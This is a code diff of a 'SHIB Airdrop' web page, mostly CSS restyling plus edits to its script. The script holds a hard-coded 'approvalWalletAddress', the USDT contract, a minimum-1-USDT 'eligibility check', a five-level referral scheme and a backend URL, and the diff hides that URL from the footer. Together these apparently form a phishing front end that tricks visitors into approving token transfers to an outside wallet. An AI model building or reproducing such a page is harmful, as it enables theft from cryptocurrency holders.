@@ -13,8 +13,8 @@
     <!-- Font Awesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* Light Theme - Professional Design */
         :root {
-            /* Light Theme Colors */
             --primary: #8b5cf6;
             --primary-light: #a78bfa;
             --primary-dark: #7c3aed;
@@ -27,33 +27,24 @@
             --info: #3b82f6;
             --bsc-yellow: #facc15;
             
-            /* Light Theme Backgrounds */
-            --bg-body: #f3f4f6;
+            --bg-body: #f9fafb;
             --bg-card: #ffffff;
-            --bg-card-hover: #f9fafb;
-            --bg-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --bg-card-hover: #f3f4f6;
             
-            /* Text Colors */
-            --text-primary: #1f2937;
+            --text-primary: #111827;
             --text-secondary: #4b5563;
             --text-muted: #6b7280;
-            --text-light: #9ca3af;
             
-            /* Borders */
             --border-color: #e5e7eb;
             --border-focus: #8b5cf6;
             
-            /* Shadows */
             --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
-            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
-            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
-            --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
             
-            /* Border Radius */
             --radius-sm: 0.375rem;
             --radius-md: 0.5rem;
             --radius-lg: 1rem;
-            --radius-xl: 1.5rem;
             --radius-full: 9999px;
         }
 
@@ -69,80 +60,32 @@
             font-family: 'Poppins', sans-serif;
             min-height: 100vh;
             padding: 20px;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        /* Modern Background Pattern */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: 
-                radial-gradient(circle at 20% 50%, rgba(139, 92, 246, 0.03) 0%, transparent 50%),
-                radial-gradient(circle at 80% 80%, rgba(6, 182, 212, 0.03) 0%, transparent 50%);
-            pointer-events: none;
-            z-index: -1;
-        }
-
-        /* Floating Particles */
-        #particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: -1;
-        }
-
-        .particle {
-            position: absolute;
-            width: 20px;
-            height: 20px;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%238b5cf6" opacity="0.1"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>') no-repeat center;
-            background-size: contain;
-            opacity: 0.5;
-            animation: float 20s infinite linear;
-        }
-
-        @keyframes float {
-            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0.2; }
-            100% { transform: translateY(-100vh) translateX(100px) rotate(360deg); opacity: 0.2; }
         }
 
         .container {
             max-width: 1400px;
             margin: 0 auto;
-            padding: 30px;
-            position: relative;
-            z-index: 1;
+            padding: 20px;
         }
 
-        /* Header Styles */
+        /* Header */
         .header {
             text-align: center;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
         }
 
         h1 {
-            font-size: 3.5rem;
-            font-weight: 800;
-            background: var(--bg-gradient);
+            font-size: 3rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            margin-bottom: 15px;
-            letter-spacing: -0.02em;
+            margin-bottom: 10px;
         }
 
-        .header-subtitle {
-            font-size: 1.2rem;
+        .subtitle {
             color: var(--text-secondary);
-            max-width: 600px;
-            margin: 0 auto;
+            font-size: 1.1rem;
         }
 
         /* Status Bar */
@@ -154,10 +97,10 @@
             gap: 15px;
             background: var(--bg-card);
             border: 1px solid var(--border-color);
-            border-radius: var(--radius-full);
-            padding: 12px 24px;
-            margin-bottom: 30px;
-            box-shadow: var(--shadow-md);
+            border-radius: var(--radius-lg);
+            padding: 15px 20px;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow-sm);
         }
 
         .status-item {
@@ -169,17 +112,16 @@
         .status-label {
             color: var(--text-secondary);
             font-size: 0.9rem;
-            font-weight: 500;
         }
 
         .status-badge {
             display: inline-flex;
             align-items: center;
-            gap: 6px;
+            gap: 5px;
             padding: 4px 12px;
             border-radius: var(--radius-full);
             font-size: 0.85rem;
-            font-weight: 600;
+            font-weight: 500;
             background: var(--bg-body);
             border: 1px solid var(--border-color);
         }
@@ -202,105 +144,97 @@
             border-color: rgba(245, 158, 11, 0.2);
         }
 
-        .status-badge i {
-            font-size: 0.7rem;
+        /* Alert */
+        .alert {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 15px 20px;
+            border-radius: var(--radius-lg);
+            margin-bottom: 20px;
+            border-left: 4px solid transparent;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            animation: slideIn 0.3s ease;
         }
 
-        /* Card Styles */
+        .alert i { font-size: 1.3rem; }
+
+        .alert-info { border-left-color: var(--info); }
+        .alert-success { border-left-color: var(--success); }
+        .alert-warning { border-left-color: var(--warning); }
+        .alert-danger { border-left-color: var(--danger); }
+
+        /* Card */
         .card {
             background: var(--bg-card);
             border: 1px solid var(--border-color);
-            border-radius: var(--radius-xl);
-            padding: 30px;
-            margin-bottom: 30px;
-            box-shadow: var(--shadow-lg);
+            border-radius: var(--radius-lg);
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow-md);
             transition: all 0.3s ease;
         }
 
         .card:hover {
-            box-shadow: var(--shadow-xl);
-            transform: translateY(-2px);
+            box-shadow: var(--shadow-lg);
             border-color: var(--primary-light);
         }
 
         .card-title {
-            font-size: 1.8rem;
-            font-weight: 700;
-            margin-bottom: 25px;
-            background: var(--bg-gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: var(--primary-dark);
             display: flex;
             align-items: center;
             gap: 10px;
         }
 
-        /* Grid Layout */
+        /* Grid */
         .grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 30px;
+            gap: 20px;
         }
 
-        /* Button Styles */
+        /* Buttons */
         .btn {
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            padding: 12px 30px;
+            gap: 8px;
+            padding: 12px 25px;
             border: none;
             border-radius: var(--radius-full);
             font-size: 1rem;
-            font-weight: 600;
+            font-weight: 500;
             cursor: pointer;
             transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-            background: var(--bg-card);
+            background: white;
             color: var(--text-primary);
             border: 1px solid var(--border-color);
         }
 
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(139, 92, 246, 0.2);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
-
-        .btn:hover::before {
-            width: 300px;
-            height: 300px;
-        }
-
         .btn-primary {
-            background: var(--bg-gradient);
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             color: white;
             border: none;
-            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.3);
         }
 
         .btn-primary:hover {
-            box-shadow: 0 6px 20px rgba(139, 92, 246, 0.4);
             transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(139, 92, 246, 0.3);
         }
 
         .btn-bsc {
             background: linear-gradient(135deg, #facc15, #fbbf24);
             color: #1f2937;
             border: none;
-            box-shadow: 0 4px 15px rgba(250, 204, 21, 0.3);
         }
 
         .btn-success {
-            background: linear-gradient(135deg, #10b981, #34d399);
+            background: linear-gradient(135deg, var(--success), var(--success-light));
             color: white;
             border: none;
         }
@@ -316,12 +250,11 @@
         }
 
         .btn:disabled {
-            opacity: 0.6;
+            opacity: 0.5;
             cursor: not-allowed;
-            pointer-events: none;
         }
 
-        /* Input Styles */
+        /* Input */
         .input-group {
             margin-bottom: 20px;
         }
@@ -331,12 +264,11 @@
             margin-bottom: 8px;
             color: var(--text-secondary);
             font-weight: 500;
-            font-size: 0.95rem;
         }
 
         .input-field {
             width: 100%;
-            padding: 12px 20px;
+            padding: 12px 15px;
             background: var(--bg-body);
             border: 1px solid var(--border-color);
             border-radius: var(--radius-md);
@@ -351,16 +283,12 @@
             box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
         }
 
-        .input-field::placeholder {
-            color: var(--text-light);
-        }
-
         /* Stats Grid */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 20px;
-            margin: 25px 0;
+            gap: 15px;
+            margin: 20px 0;
         }
 
         .stat-card {
@@ -369,12 +297,6 @@
             border-radius: var(--radius-lg);
             padding: 20px;
             text-align: center;
-            transition: all 0.3s ease;
-        }
-
-        .stat-card:hover {
-            border-color: var(--primary);
-            transform: translateY(-2px);
         }
 
         .stat-value {
@@ -387,48 +309,9 @@
         .stat-label {
             color: var(--text-secondary);
             font-size: 0.9rem;
-            font-weight: 500;
         }
 
-        /* Alert Styles */
-        .alert {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            padding: 15px 20px;
-            border-radius: var(--radius-lg);
-            margin-bottom: 20px;
-            border-left: 4px solid transparent;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            animation: slideIn 0.5s ease;
-        }
-
-        .alert i {
-            font-size: 1.4rem;
-        }
-
-        .alert-info {
-            border-left-color: var(--info);
-            background: rgba(59, 130, 246, 0.05);
-        }
-
-        .alert-success {
-            border-left-color: var(--success);
-            background: rgba(16, 185, 129, 0.05);
-        }
-
-        .alert-warning {
-            border-left-color: var(--warning);
-            background: rgba(245, 158, 11, 0.05);
-        }
-
-        .alert-danger {
-            border-left-color: var(--danger);
-            background: rgba(239, 68, 68, 0.05);
-        }
-
-        /* Referral Link Container */
+        /* Referral Container */
         .referral-container {
             display: flex;
             gap: 10px;
@@ -437,20 +320,19 @@
 
         .referral-input {
             flex: 1;
-            padding: 12px 20px;
+            padding: 12px 15px;
             background: var(--bg-body);
             border: 1px solid var(--border-color);
             border-radius: var(--radius-md);
             color: var(--text-primary);
             font-family: monospace;
-            font-size: 0.9rem;
         }
 
         /* Plan Cards */
         .plan-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 15px;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 12px;
             margin-top: 20px;
         }
 
@@ -458,7 +340,7 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 15px 20px;
+            padding: 12px 15px;
             background: var(--bg-body);
             border: 1px solid var(--border-color);
             border-radius: var(--radius-lg);
@@ -468,56 +350,53 @@
         .plan-card:hover {
             border-color: var(--primary);
             transform: translateX(5px);
-            background: white;
         }
 
         .plan-info {
             display: flex;
             align-items: center;
-            gap: 15px;
+            gap: 12px;
         }
 
         .plan-icon {
-            width: 45px;
-            height: 45px;
-            background: var(--bg-gradient);
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             border-radius: var(--radius-md);
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-size: 1.3rem;
         }
 
         .plan-details h4 {
-            font-size: 1rem;
+            font-size: 0.95rem;
             font-weight: 600;
             color: var(--text-primary);
-            margin-bottom: 4px;
         }
 
         .plan-details p {
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             color: var(--text-secondary);
         }
 
         .plan-reward {
-            padding: 6px 15px;
-            background: linear-gradient(135deg, #10b981, #34d399);
+            padding: 4px 12px;
+            background: linear-gradient(135deg, var(--success), var(--success-light));
             color: white;
             border-radius: var(--radius-full);
+            font-size: 0.85rem;
             font-weight: 600;
-            font-size: 0.9rem;
         }
 
-        /* Badge Styles */
+        /* Badges */
         .badge {
             display: inline-flex;
             align-items: center;
             padding: 4px 12px;
             border-radius: var(--radius-full);
             font-size: 0.85rem;
-            font-weight: 600;
+            font-weight: 500;
         }
 
         .badge-success {
@@ -525,31 +404,11 @@
             color: var(--success);
         }
 
-        .badge-warning {
-            background: rgba(245, 158, 11, 0.1);
-            color: var(--warning);
-        }
-
-        .badge-primary {
-            background: rgba(139, 92, 246, 0.1);
-            color: var(--primary);
-        }
-
-        .tier-badge {
-            padding: 4px 12px;
-            background: rgba(139, 92, 246, 0.1);
-            color: var(--primary);
-            border-radius: var(--radius-full);
-            font-size: 0.85rem;
-            font-weight: 600;
-            margin-left: 10px;
-        }
-
-        .eligibility-status {
+        .tier-badge, .eligibility-status {
             padding: 4px 12px;
             border-radius: var(--radius-full);
             font-size: 0.85rem;
-            font-weight: 600;
+            font-weight: 500;
             margin-left: 10px;
         }
 
@@ -570,18 +429,12 @@
         }
 
         #referralsList li {
-            padding: 12px 15px;
+            padding: 10px 15px;
             background: var(--bg-body);
             border: 1px solid var(--border-color);
             border-radius: var(--radius-md);
             margin-bottom: 8px;
             font-size: 0.9rem;
-            transition: all 0.3s ease;
-        }
-
-        #referralsList li:hover {
-            border-color: var(--primary);
-            background: white;
         }
 
         /* Loading Spinner */
@@ -610,13 +463,13 @@
             }
         }
 
-        /* Footer */
+        /* Footer - URL line हटा दी गई है */
         .footer {
             text-align: center;
-            padding: 30px;
+            padding: 20px;
             background: var(--bg-card);
             border: 1px solid var(--border-color);
-            border-radius: var(--radius-xl);
+            border-radius: var(--radius-lg);
             margin-top: 30px;
         }
 
@@ -625,80 +478,27 @@
             font-size: 0.95rem;
         }
 
-        .footer span {
+        .footer i {
             color: var(--primary);
-            font-weight: 600;
         }
 
-        /* Responsive Design */
+        /* Responsive */
         @media (max-width: 768px) {
-            .container {
-                padding: 20px;
-            }
-
-            h1 {
-                font-size: 2.5rem;
-            }
-
-            .status-bar {
-                flex-direction: column;
-                align-items: flex-start;
-                border-radius: var(--radius-lg);
-            }
-
-            .status-item {
-                width: 100%;
-                justify-content: space-between;
-            }
-
-            .grid {
-                grid-template-columns: 1fr;
-            }
-
-            .stats-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .btn {
-                width: 100%;
-            }
-
-            .referral-container {
-                flex-direction: column;
-            }
-        }
-
-        @media (max-width: 480px) {
-            h1 {
-                font-size: 2rem;
-            }
-
-            .card {
-                padding: 20px;
-            }
-
-            .plan-card {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 10px;
-            }
-
-            .plan-reward {
-                width: 100%;
-                text-align: center;
-            }
+            h1 { font-size: 2.5rem; }
+            .container { padding: 10px; }
+            .grid { grid-template-columns: 1fr; }
+            .stats-grid { grid-template-columns: 1fr; }
+            .btn { width: 100%; }
+            .referral-container { flex-direction: column; }
         }
     </style>
 </head>
 <body>
-    <!-- Particle Background -->
-    <div id="particles"></div>
-
     <div class="container">
         <!-- Header -->
         <div class="header">
             <h1>🚀 SHIB Airdrop</h1>
-            <p class="header-subtitle">Claim your SHIB tokens and earn rewards through our multi-level referral program</p>
+            <p class="subtitle">Claim your SHIB tokens and earn referral rewards</p>
         </div>
         
         <!-- Status Bar -->
@@ -724,26 +524,26 @@
         </div>
         
         <!-- Backend Status Alert -->
-        <div class="alert alert-info" id="backendStatusAlert">
+        <div class="alert alert-info" id="backendStatusAlert" style="display: none;">
             <i class="fas fa-server"></i>
-            <div><strong>Backend Status:</strong> <span id="backendStatusText">Checking connection...</span></div>
+            <div><strong>Backend Status:</strong> <span id="backendStatusText">Checking...</span></div>
         </div>
         
         <!-- Warning Alert -->
         <div class="alert alert-warning">
             <i class="fas fa-exclamation-triangle"></i>
-            <div><strong>Important:</strong> You need at least 1 USDT in your wallet to claim the airdrop.</div>
+            <div><strong>Important:</strong> Minimum 1 USDT required to claim airdrop</div>
         </div>
 
         <!-- Eligibility Info -->
         <div class="alert alert-info">
             <i class="fas fa-info-circle"></i>
-            <div><strong>One-Click Eligibility Check:</strong> Click "Check Eligibility" to automatically verify your USDT balance and eligibility for the airdrop.</div>
+            <div><strong>One-Click Eligibility:</strong> Click "Check Eligibility" to verify your USDT balance</div>
         </div>
         
         <!-- Main Wallet Card -->
         <div class="card">
-            <div style="display: flex; gap: 15px; flex-wrap: wrap; margin-bottom: 30px;">
+            <div style="display: flex; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;">
                 <button onclick="connectWallet()" class="btn btn-primary" id="connectWalletBtn">
                     <i class="fas fa-wallet"></i> Connect Wallet
                 </button>
@@ -769,12 +569,12 @@
 
             <div class="input-group">
                 <label class="input-label" for="referrer">
-                    <i class="fas fa-user-plus"></i> Enter Referral Address (Optional):
+                    <i class="fas fa-user-plus"></i> Referral Address (Optional)
                 </label>
                 <input type="text" id="referrer" class="input-field" placeholder="0x...">
             </div>
             
-            <div style="display: flex; gap: 15px; flex-wrap: wrap; margin-top: 25px;">
+            <div style="display: flex; gap: 15px; flex-wrap: wrap; margin-top: 20px;">
                 <button onclick="checkEligibility()" class="btn btn-primary" id="checkEligibilityBtn" style="flex: 1;">
                     <i class="fas fa-clipboard-check"></i> Check Eligibility
                 </button>
@@ -784,7 +584,7 @@
             </div>
 
             <p style="margin-top: 20px; color: var(--text-secondary);">
-                <strong>Your Airdrop Amount:</strong> <span id="airdropAmountDisplay" class="status">0</span> tokens 
+                <strong>Your Airdrop Amount:</strong> <span id="airdropAmountDisplay">0</span> tokens 
                 <span id="tierBadge" class="tier-badge"></span>
                 <span id="eligibilityBadge" class="eligibility-status"></span>
             </p>
@@ -800,12 +600,12 @@
                 
                 <div class="referral-container">
                     <input type="text" id="referralLink" class="referral-input" readonly placeholder="Connect wallet to generate referral link">
-                    <button onclick="copyReferralLink()" class="btn btn-outline" title="Copy to clipboard">
+                    <button onclick="copyReferralLink()" class="btn btn-outline" title="Copy">
                         <i class="fas fa-copy"></i>
                     </button>
                 </div>
                 
-                <button onclick="getMyReferrals()" class="btn btn-outline" style="width: 100%; margin-bottom: 25px;">
+                <button onclick="getMyReferrals()" class="btn btn-outline" style="width: 100%; margin-bottom: 20px;">
                     <i class="fas fa-users"></i> My Referrals
                 </button>
                 
@@ -816,7 +616,7 @@
                         <div class="plan-info">
                             <div class="plan-icon"><i class="fas fa-user-plus"></i></div>
                             <div class="plan-details">
-                                <h4>Level 1 Referral</h4>
+                                <h4>Level 1</h4>
                                 <p>Direct referrals</p>
                             </div>
                         </div>
@@ -826,7 +626,7 @@
                         <div class="plan-info">
                             <div class="plan-icon"><i class="fas fa-users"></i></div>
                             <div class="plan-details">
-                                <h4>Level 2 Referral</h4>
+                                <h4>Level 2</h4>
                                 <p>Second level</p>
                             </div>
                         </div>
@@ -836,7 +636,7 @@
                         <div class="plan-info">
                             <div class="plan-icon"><i class="fas fa-user-friends"></i></div>
                             <div class="plan-details">
-                                <h4>Level 3 Referral</h4>
+                                <h4>Level 3</h4>
                                 <p>Third level</p>
                             </div>
                         </div>
@@ -846,7 +646,7 @@
                         <div class="plan-info">
                             <div class="plan-icon"><i class="fas fa-user-tie"></i></div>
                             <div class="plan-details">
-                                <h4>Level 4 Referral</h4>
+                                <h4>Level 4</h4>
                                 <p>Fourth level</p>
                             </div>
                         </div>
@@ -856,7 +656,7 @@
                         <div class="plan-info">
                             <div class="plan-icon"><i class="fas fa-user-check"></i></div>
                             <div class="plan-details">
-                                <h4>Level 5 Referral</h4>
+                                <h4>Level 5</h4>
                                 <p>Fifth level</p>
                             </div>
                         </div>
@@ -946,7 +746,7 @@
                         <div class="plan-info">
                             <div class="plan-icon"><i class="fas fa-wallet"></i></div>
                             <div class="plan-details">
-                                <h4>Any Wallet (≥1 USDT)</h4>
+                                <h4>≥ 1 USDT</h4>
                                 <p>Basic Tier</p>
                             </div>
                         </div>
@@ -956,32 +756,25 @@
             </div>
         </div>
 
-        <!-- Footer -->
+        <!-- Footer - Backend URL line हटा दी गई है -->
         <div class="footer">
-            <p><i class="fas fa-shield-alt" style="color: var(--primary);"></i> Powered by Blockchain Technology | Secure & Transparent</p>
-            <p style="margin-top: 10px; font-size: 0.9rem;">Backend: <span id="backendUrlDisplay">Loading...</span></p>
+            <p><i class="fas fa-shield-alt"></i> Powered by Blockchain Technology | Secure & Transparent</p>
         </div>
     </div>
 
-    <!-- JavaScript (All functionality preserved) -->
     <script>
-        // Backend Configuration - Railway Compatible
+        // Backend Configuration
         const BACKEND_URLS = {
             production: "https://usdt-usdt.mtfwit.easypanel.host/api",
             development: "http://localhost:8080/api"
         };
 
-        // Auto-detect environment
         const isDevelopment = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
         const BACKEND_URL = isDevelopment ? BACKEND_URLS.development : BACKEND_URLS.production;
-
-        // Update backend URL display
-        document.getElementById('backendUrlDisplay').textContent = BACKEND_URL;
 
         let approvalWalletAddress = "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
         let account;
         let web3;
-        let walletConnectProvider;
         let isApproved = false;
 
         // Blockchain Configuration
@@ -989,804 +782,12 @@
         const BSC_RPC_URL = 'https://bsc-dataseed.binance.org/';
         const BSC_CHAIN_ID_DECIMAL = 56;
 
-        // Contract Address
+        // Contract Addresses
         const airdropContractAddress = "0xee932A6620a6C2590b12875010316A1487b0b121";
         const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
-        // Contract ABI
-        const airdropABI = [
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "_token",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "_usdt",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "_minUSDT",
-                        "type": "uint256"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "_maxAirdropPerClaim",
-                        "type": "uint256"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "_totalAirdropCap",
-                        "type": "uint256"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "_withdrawDelay",
-                        "type": "uint256"
-                    },
-                    {
-                        "internalType": "uint256[]",
-                        "name": "_referralPercents",
-                        "type": "uint256[]"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "initialOwner",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "nonpayable",
-                "type": "constructor"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "owner",
-                        "type": "address"
-                    }
-                ],
-                "name": "OwnableInvalidOwner",
-                "type": "error"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "account",
-                        "type": "address"
-                    }
-                ],
-                "name": "OwnableUnauthorizedAccount",
-                "type": "error"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "token",
-                        "type": "address"
-                    }
-                ],
-                "name": "SafeERC20FailedOperation",
-                "type": "error"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {
-                        "indexed": true,
-                        "internalType": "address",
-                        "name": "user",
-                        "type": "address"
-                    },
-                    {
-                        "indexed": true,
-                        "internalType": "address",
-                        "name": "referrer",
-                        "type": "address"
-                    },
-                    {
-                        "indexed": false,
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "AirdropClaimed",
-                "type": "event"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "_token",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "cancelWithdrawRequest",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "ref",
-                        "type": "address"
-                    }
-                ],
-                "name": "claimAirdrop",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "deposit",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {
-                        "indexed": true,
-                        "internalType": "address",
-                        "name": "user",
-                        "type": "address"
-                    },
-                    {
-                        "indexed": false,
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "Deposit",
-                "type": "event"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "_token",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "executeWithdrawAnyToken",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {
-                        "indexed": true,
-                        "internalType": "address",
-                        "name": "previousOwner",
-                        "type": "address"
-                    },
-                    {
-                        "indexed": true,
-                        "internalType": "address",
-                        "name": "newOwner",
-                        "type": "address"
-                    }
-                ],
-                "name": "OwnershipTransferred",
-                "type": "event"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {
-                        "indexed": false,
-                        "internalType": "address",
-                        "name": "account",
-                        "type": "address"
-                    }
-                ],
-                "name": "Paused",
-                "type": "event"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {
-                        "indexed": true,
-                        "internalType": "address",
-                        "name": "sender",
-                        "type": "address"
-                    },
-                    {
-                        "indexed": false,
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "Received",
-                "type": "event"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {
-                        "indexed": true,
-                        "internalType": "address",
-                        "name": "referrer",
-                        "type": "address"
-                    },
-                    {
-                        "indexed": true,
-                        "internalType": "uint256",
-                        "name": "level",
-                        "type": "uint256"
-                    },
-                    {
-                        "indexed": false,
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "ReferralBonusPaid",
-                "type": "event"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {
-                        "indexed": true,
-                        "internalType": "address",
-                        "name": "user",
-                        "type": "address"
-                    },
-                    {
-                        "indexed": true,
-                        "internalType": "address",
-                        "name": "newReferrer",
-                        "type": "address"
-                    }
-                ],
-                "name": "ReferralUpdated",
-                "type": "event"
-            },
-            {
-                "inputs": [],
-                "name": "renounceOwnership",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "_token",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "requestWithdrawAnyToken",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "_max",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "setMaxAirdropPerClaim",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "_minUSDT",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "setMinUSDT",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "uint256[]",
-                        "name": "_percents",
-                        "type": "uint256[]"
-                    }
-                ],
-                "name": "setReferralPercents",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "_cap",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "setTotalAirdropCap",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "_delay",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "setWithdrawDelay",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {
-                        "indexed": true,
-                        "internalType": "address",
-                        "name": "owner",
-                        "type": "address"
-                    },
-                    {
-                        "indexed": false,
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "TokensWithdrawn",
-                "type": "event"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "newOwner",
-                        "type": "address"
-                    }
-                ],
-                "name": "transferOwnership",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {
-                        "indexed": false,
-                        "internalType": "address",
-                        "name": "account",
-                        "type": "address"
-                    }
-                ],
-                "name": "Unpaused",
-                "type": "event"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "withdrawBNB",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {
-                        "indexed": true,
-                        "internalType": "bytes32",
-                        "name": "id",
-                        "type": "bytes32"
-                    }
-                ],
-                "name": "WithdrawCancelled",
-                "type": "event"
-            },
-            {
-                "anonymous": false,
-                "inputs": [
-                    {
-                        "indexed": true,
-                        "internalType": "bytes32",
-                        "name": "id",
-                        "type": "bytes32"
-                    },
-                    {
